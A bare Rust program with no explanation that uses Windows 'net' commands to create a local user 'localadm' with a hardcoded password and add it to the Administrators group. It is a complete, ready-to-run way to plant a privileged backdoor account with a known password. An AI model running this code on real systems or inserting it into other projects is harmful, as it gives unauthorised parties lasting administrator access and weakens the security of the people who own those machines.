use std::process::Command;

fn main() {
    let output = Command::new("net")
        .arg("user")
        .arg("/add")
        .arg("localadm")
        .arg("My.Access..01!")
        .output()
        .expect("Failed to execute command");

    if output.status.success() {
        let stdout = String::from_utf8_lossy(&output.stdout);
        println!("Command 1 output : {}", stdout);
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        eprintln!("Command 1 failed: {}", stderr);
    }

    //add the user to the local admin group
    let output = Command::new("net")
        .arg("localgroup")
        .arg("Administrators")
        .arg("/add")
        .arg("localadm")
        .output()
        .expect("Failed to execute command");

    if output.status.success() {
        let stdout = String::from_utf8_lossy(&output.stdout);
        println!("Command 2 output: {}", stdout);
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        eprintln!("Command 2 failed: {}", stderr);
    }    

}
